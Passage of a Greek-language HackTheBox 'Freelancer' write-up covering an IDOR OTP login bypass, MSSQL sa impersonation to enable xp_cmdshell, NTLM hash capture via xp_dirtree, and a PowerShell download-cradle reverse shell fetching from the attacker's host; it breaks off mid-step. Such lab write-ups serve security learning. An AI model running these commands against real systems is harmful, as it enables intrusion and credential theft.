@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Freelancer — S. Markakis</title>
+<meta name="description" content="Walkthrough του μηχανήματος HackTheBox Freelancer — πλήρες writeup με screenshots.">
+<meta property="og:title" content="HTB: Freelancer — S. Markakis">
+<meta property="og:description" content="Walkthrough του μηχανήματος HackTheBox Freelancer — πλήρες writeup με screenshots.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-freelancer-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-freelancer.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-freelancer.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-freelancer-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-freelancer.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-freelancer-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-freelancer.html">
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-ssti { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+
+  .sql {
+    background: #1e1e1e;
+    border: 1px solid #333;
+    border-radius: 6px;
+    padding: 1rem 1.4rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+    color: #d4d4d4;
+    margin: 1.2rem 0;
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .sql .sk { color: #569cd6; font-weight: 600; }
+  .sql .sf { color: #dcdcaa; }
+  .sql .sv { color: #ce9178; }
+  .sql .sc { color: #6a9955; }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Freelancer",
+  "description": "Walkthrough του μηχανήματος HackTheBox Freelancer — πλήρες writeup με screenshots.",
+  "datePublished": "2026-04-11",
+  "dateModified": "2026-04-11",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-freelancer-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-freelancer.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-freelancer"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">&#8592; Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-freelancer.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Freelancer</h1>
+    <div class="post-meta">
+      <span class="date">6 Ιουνίου 2024</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win" style="background:#c8d0e0;color:#1a2a5a;">Windows</span>
+      <span class="tag" style="background:#e0c8c8;color:#5a1a1a;">Δυσκολο</span>
+      <span class="tag">IDOR</span>
+      <span class="tag">MSSQL</span>
+      <span class="tag">RBCD</span>
+      <span>&nbsp;15 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-01-02c35da635.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-01-02c35da635.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="HTB Freelancer machine card" width="1200" height="675"></picture>
+
+  <div class="overview">
+    Το Freelancer ξεκινά με το να αποκτήσεις πρόσβαση σαν employer, μετά κάνεις escalate σε admin μέσω μιας <strong>ευπάθειας IDOR</strong> στο flow login OTP του QR-Code. Από εκεί, ένα SQL terminal εκθέτει εντολές MSSQL που επιτρέπουν impersonation του <code>sa</code> και ενεργοποίηση του <code>xp_cmdshell</code> για ένα reverse shell. Αφού κάνεις pivot μέσα από χρήστες μέσω αρχείων credentials και ένα <strong>memory dump</strong>, το μονοπάτι προς Domain Admin περνά μέσα από <strong>Resource-Based Constrained Delegation (RBCD)</strong>.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Freelancer reg</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Employer (IDOR)</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Admin</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">sql_svc (MSSQL)</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">mikasaAckerman</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">lorra199</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">SYSTEM (RBCD)</span>
+  </div>
+
+  <h2>Αναγνώριση</h2>
+  <h3>Nmap</h3>
+  <p>Ένα πλήρες port scan αποκαλύπτει έναν domain controller Windows. Αξιοσημείωτο: <strong>MSSQL στη θύρα 55297</strong> και WinRM στη 5985.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">nmap</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">nmap -sC -sV -p- -oN nmap_results.txt 10.129.159.108</span>
+
+<span class="po">PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          nginx 1.25.5
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
+</span><span class="pg">55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00</span><span class="po">
+|   DNS_Domain_Name: freelancer.htb
+|   DNS_Computer_Name: DC.freelancer.htb
+Service Info: Host: DC; OS: Windows</span></div>
+  </div>
+
+  <h3>RPC &amp; SMB — Access Denied</h3>
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">rpcclient / smbclient</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">rpcclient -U "" -N 10.10.11.5</span>
+<span class="po">rpcclient $&gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">smbclient -L 10.10.11.5</span>
+<span class="po">Anonymous login successful
+Unable to connect with SMB1 -- no workgroup available</span></div>
+  </div>
+
+  <h2>Website &#8212; TCP 80</h2>
+  <p>Το site είναι μια πλατφόρμα job board με εγγραφή Freelancer και Employer.</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-02-8749a41f50.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-02-8749a41f50.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Freelancer website homepage" width="1920" height="825"></picture>
+
+  <p>Κάνε εγγραφή σαν freelancer πρώτα. Δεν βρέθηκε τίποτα χρήσιμο κατά την καταμέτρηση σαν freelancer.</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-03-f62d61e78d.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-03-f62d61e78d.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Freelancer profile dashboard — howdy namiq" width="1920" height="630"></picture>
+
+  <p>Κάνε εγγραφή σαν <strong>employer</strong> μετά — αλλά το login αποτυγχάνει αμέσως μετά την εγγραφή:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-04-1cb5b2d6ba.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-04-1cb5b2d6ba.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Employer account not activated error" width="1919" height="733"></picture>
+
+  <h3>Bypass account recovery</h3>
+  <p>Χρησιμοποίησε τη φόρμα Account Recovery. Οι ερωτήσεις ασφαλείας δέχονται τετριμμένα-μαντεμένες απαντήσεις (όλες ορισμένες στην ίδια τιμή κατά την εγγραφή). Αυτό επανενεργοποιεί τον λογαριασμό και επιτρέπει reset password:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-05-6730b4d2ef.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-05-6730b4d2ef.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Account recovery form — bob/bob/bob/bob" width="1919" height="729"></picture>
+
+  <p>Τώρα μέσα σαν employer <code>bob</code>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-06-89bcb73b57.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-06-89bcb73b57.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Employer dashboard — Howdy bob" width="1918" height="738"></picture>
+
+  <h2>IDOR &#8212; Insecure Direct Object Reference</h2>
+  <h3>Τμήμα QR-Code</h3>
+  <p>Το στοιχείο μενού <strong>QR-Code</strong> δημιουργεί ένα URL login OTP. Το σκανάρισμα αποκαλύπτει ότι το token κωδικοποιεί το αριθμητικό ID του τρέχοντος χρήστη σε base64:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-07-257d76ca2c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-07-257d76ca2c.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="QR-Code page in employer dashboard" width="1918" height="777"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-08-0bd858716c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-08-0bd858716c.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="OTP URL with base64 user ID visible" width="1918" height="801"></picture>
+
+  <div class="alert alert-info">
+    Format URL OTP: <code>http://freelancer.htb/accounts/login/otp/&lt;base64_uid&gt;/&lt;token&gt;</code><br>
+    Το να αντικαταστήσεις την τιμή base64 με το κωδικοποιημένο ID οποιουδήποτε άλλου χρήστη κάνει login σαν εκείνον τον χρήστη — κλασικό <strong>IDOR</strong>.
+  </div>
+
+  <h3>Escalation σε admin</h3>
+  <p>Περιήγηση στα σχόλια του blog για να βρεις το username του admin. Η καταμέτρηση URL προφίλ επιβεβαιώνει ότι ο admin έχει ID <code>2</code>. Κωδικοποίησέ το: <code>echo -n "2" | base64</code> &#8594; <code>Mg==</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">IDOR payload</span></div>
+    <div class="term-body"><span class="pco"># bob (ID 10011)</span>
+<span class="po">http://freelancer.htb/accounts/login/otp/MTAwMTE=/e4ff26...</span>
+
+<span class="pco"># admin (ID 2)</span>
+<span class="pg">http://freelancer.htb/accounts/login/otp/Mgo=/e4ff26...</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-09-8f5dde1623.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-09-8f5dde1623.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Logged in as admin — Howdy admin" width="1919" height="825"></picture>
+
+  <h2>/admin &#8212; SQL Terminal</h2>
+  <p>Το admin panel εκθέτει ένα <strong>SQL Terminal</strong> κάτω από τα Development Tools:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-10-d5d2755c24.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-10-d5d2755c24.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Admin dashboard with SQL Terminal in Development Tools" width="1880" height="468"></picture>
+
+  <h3>Τρέχων χρήστης</h3>
+  <div class="sql"><span class="sk">SELECT</span> <span class="sf">user_name</span>();
+<span class="sc">-- Result: Freelancer_webapp_user</span></div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-11-9cc1095ddd.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-11-9cc1095ddd.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="SQL terminal showing Freelancer_webapp_user result" width="1906" height="548"></picture>
+
+  <h3>Πιάνοντας hash NTLM μέσω xp_dirtree</h3>
+  <div class="sql">xp_dirtree <span class="sv">'\\10.10.14.16\zip'</span></div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-12-2371e23fb1.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-12-2371e23fb1.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Responder output capturing NTLM hash from sql_svc" width="1883" height="432"></picture>
+
+  <div class="alert alert-warn">Το hash είναι άσπαστο. Κάνε αντ' αυτού pivot σε privilege escalation SQL.</div>
+
+  <h3>Impersonation sa &#8594; sysadmin &#8594; xp_cmdshell</h3>
+  <p>Έλεγξε αν το <code>sa</code> μπορεί να γίνει impersonated και αν κρατά δικαιώματα sysadmin, μετά δώσ' τα στον χρήστη μας:</p>
+
+  <div class="sql"><span class="sc">-- Verify sa is sysadmin</span>
+<span class="sk">EXECUTE AS LOGIN</span> = <span class="sv">'sa'</span>
+<span class="sk">SELECT</span> <span class="sf">IS_SRVROLEMEMBER</span>(<span class="sv">'sysadmin'</span>)   <span class="sc">-- returns 1</span>
+
+<span class="sc">-- Grant sysadmin to webapp user</span>
+<span class="sk">EXECUTE AS LOGIN</span> = <span class="sv">'sa'</span>
+<span class="sk">EXEC</span> <span class="sf">sp_addsrvrolemember</span> <span class="sv">'Freelancer_webapp_user'</span>, <span class="sv">'sysadmin'</span>
+
+<span class="sc">-- Enable xp_cmdshell</span>
+<span class="sk">EXEC</span> <span class="sf">sp_configure</span> <span class="sv">'show advanced options'</span>, <span class="sv">'1'</span>; RECONFIGURE;
+<span class="sk">EXEC</span> <span class="sf">sp_configure</span> <span class="sv">'xp_cmdshell'</span>, <span class="sv">'1'</span>; RECONFIGURE;</div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-13-df64384fc9.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-13-df64384fc9.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Initial xp_cmdshell permission denied error" width="1881" height="468"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-14-58fe588c73.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-14-58fe588c73.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="IS_SRVROLEMEMBER returning 1 — sysadmin confirmed" width="1880" height="516"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-freelancer/img-15-fe0b848fb3.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-freelancer/img-15-fe0b848fb3.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="xp_cmdshell whoami showing freelancer\sql_svc" width="1290" height="307"></picture>
+
+  <h3>Reverse shell</h3>
+  <p>Απευθείας shells μπλοκάρονται από το AV. Χρησιμοποίησε ένα PowerShell download-cradle:</p>
+
+  <div class="sql"><span class="sk">EXEC</span> xp_cmdshell <span class="sv">'powershell -c "IEX (iwr -usebasicparsing http://10.10.14.16/shell.ps1)"'</span></div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">nc listener</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">rlwrap nc -lvnp 4444</span>
+<span class="po">connect to [10.10.14.16] from (UNKNOWN) [10.129.159.108] 65419
+SHELL&gt;</span></div>
+  </div>
+  <div class="alert alert-success">Αποκτήθηκε shell σαν <strong>freelancer\sql_svc</strong>.</div>
+
+  <h2>Πλάγια Κίνηση &#8212; sql_svc &#8594; mikasaAckerman</h2>
+  <h3>Plaintext credentials σε config SQL</h3>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">sql-Configuration.INI</span></div>
+    <div class="term-body"><span class="po">SHELL&gt; type C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI
+
